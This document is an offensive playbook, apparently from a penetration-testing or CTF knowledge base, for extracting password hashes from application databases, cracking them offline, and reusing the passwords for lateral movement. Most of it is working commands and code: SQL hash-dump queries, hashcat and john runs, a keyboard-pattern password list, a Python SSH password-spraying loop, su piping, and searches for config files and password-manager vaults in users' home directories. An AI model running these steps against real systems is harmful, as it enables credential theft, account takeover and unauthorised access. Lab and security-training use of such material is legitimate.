# Password Attacks — Database Hash → Lateral Movement

## When this applies

- You have access to an application database (via LFI config read, SQLi, exposed `.env`).
- The DB stores user credentials (web app, FTP, admin panel).
- Goal: extract hashes, crack offline, then test password reuse on system accounts (SSH, su, RDP).

## Technique

Application user passwords are commonly reused for system accounts (SSH, sudo, AD). Extract hashes from the DB, crack the weak ones offline, then sweep system services with the recovered plaintexts.

## Steps

### 1. Extract hashes from the DB

```sql
SELECT username, email, password FROM users;
SELECT email, password_hash FROM accounts;
SELECT username, hash FROM admin_users;
```

Save to disk in `<user>:<hash>` format.

### 2. Identify hash type

```bash
hashid hashes.txt
```

Common formats in app DBs:
- bcrypt: `$2y$`, `$2a$`, `$2b$` — slow.
- Argon2: `$argon2id$` — slow.
- SHA-256: 64 hex chars — fast (often unsalted).
- MD5: 32 hex — fast (terrible practice but still seen).
- PHPass: `$P$` — Wordpress-style.

### 3. Crack with appropriate tool

```bash
# bcrypt: ~30 hashes/sec on CPU — slow. Use targeted wordlists FIRST
john --wordlist=keyboard-patterns.txt hashes.txt
john --wordlist=app-themed-words.txt hashes.txt
john --wordlist=rockyou.txt hashes.txt    # if time permits

# SHA-256 (unsalted): hashcat -m 1400, blazing fast
hashcat -m 1400 hashes.txt rockyou.txt -r rules/best64.rule

# MD5
hashcat -m 0 hashes.txt rockyou.txt
```

### 4. Try keyboard-pattern passwords (high hit rate)

```
!QAZ2wsx
1qaz2wsx
!QAZ@WSX
3edc4rfv
1qaz2wsx3edc
qwerty123
asdfghjkl
zxcvbnm
```

These are keyboard column walks — surprisingly common, especially in CTF/lab environments.

### 5. Test password reuse on SSH

```bash
# sshpass for non-interactive password
sshpass -p 'CRACKED_PASS' ssh -o StrictHostKeyChecking=no user@target
```

Spray the cracked password across all extracted usernames:

```python
import subprocess
for line in open('cracked.txt'):
    user, pw = line.strip().split(':', 1)
    r = subprocess.run(['sshpass','-p',pw,'ssh','-o','StrictHostKeyChecking=no',
                        '-o','ConnectTimeout=5',f'{user}@target','id'],
                       capture_output=True)
    if r.returncode == 0:
        print(f'[+] SSH: {user}:{pw}')
```

### 6. Test `su` from existing shell

```bash
echo 'CRACKED_PASS' | su -c 'id' USERNAME
```

Useful when you have a low-priv shell but no SSH access; `su` jumps to other users locally.

### 7. After lateral movement: check sudo

```bash
sudo -l
```

Even with restrictions like `targetpw`, having `(ALL) ALL` opens escalation. See `system/scenarios/linux-privesc/sudo-symlink.md` for sudo abuse.

### 8. Application config file hash extraction

Some apps store per-user creds in XML/config files outside the DB:

```bash
find /opt /etc /var -name "*.xml" -path "*/users/*" 2>/dev/null
find /opt /etc /var -name "*.ini" -path "*/conf/*" 2>/dev/null
```

Common formats:
- `<Password>HASH</Password>` with `<PasswordSalt>SALT</PasswordSalt>` (salted SHA-256)
- `<hash>BCRYPT_HASH</hash>`

Crack salted SHA-256:
```bash
hashcat -m 1410 'hash:salt' rockyou.txt
```

These are often admin credentials with reuse on SSH/system accounts.

### 9. Local encrypted password-vault cracking

When a target user installs a CLI password manager (`pip list`, `dpkg.log`, shell history), the encrypted vault is at a predictable XDG path and is often world-readable even when the user's home dir is mode 700 (the file is 644 and parent traversal works through 711/755 dirs).

Discovery checklist:

1. Detect the manager:
   ```bash
   find /usr/local/lib/python3.*/dist-packages -maxdepth 2
   cat /var/log/dpkg.log* | grep -iE "(pswm|pwsm|gopass|pass-store|passpie|keepass|bitwarden)"
   cat ~/.bashrc ~/.profile  # of any user
   ```

2. Map the manager → vault path:
   - `pswm` (cryptocode AES-GCM): `~/.local/share/pswm/pswm`
   - `pass` (passwordstore.org, GPG): `~/.password-store/*.gpg`
   - `passpie`: `~/.passpie/credentials.yml`
   - `gopass`: `~/.local/share/gopass/stores/root/*`
   - `keepassxc`: `~/.cache/keepassxc/*.kdbx`, `~/Documents/*.kdbx`
   - `bw` (Bitwarden CLI): `~/.config/Bitwarden\ CLI/data.json`

3. Read via AFR — if `~/.bashrc` is readable, traversal works → vault is also readable.

See `encrypted-container-cracking.md` for cracking details (cryptocode, KeePass, Bitwarden).

## Verifying success

- Cracked password authenticates via SSH for at least one user.
- Lateral movement target is reachable and a shell is established.
- `sudo -l` shows escalation paths.

## Common pitfalls

- bcrypt cracking is slow — keep wordlists targeted.
- Application DB users may not have system accounts with the same name.
- Some users have unique strong passwords; reuse rate is ~30%, not 100%.
- Audit logs may flag cracked-password attempts on SSH.
- Brute-forcing SSH triggers lockout / fail2ban — slow it down.

## Tools

- `hashid`, `hashcat`, `john` for offline cracking.
- `sshpass` for non-interactive SSH.
- `nxc` / `crackmapexec` for parallel SSH testing.
- Custom Python with `paramiko` / `subprocess`.

## References

- MITRE ATT&CK T1110.002 (Password Cracking).
- CWE-916 (Insufficient Hash Computational Effort).
- See `pass-the-hash.md` for hash-based (non-cracking) lateral movement.
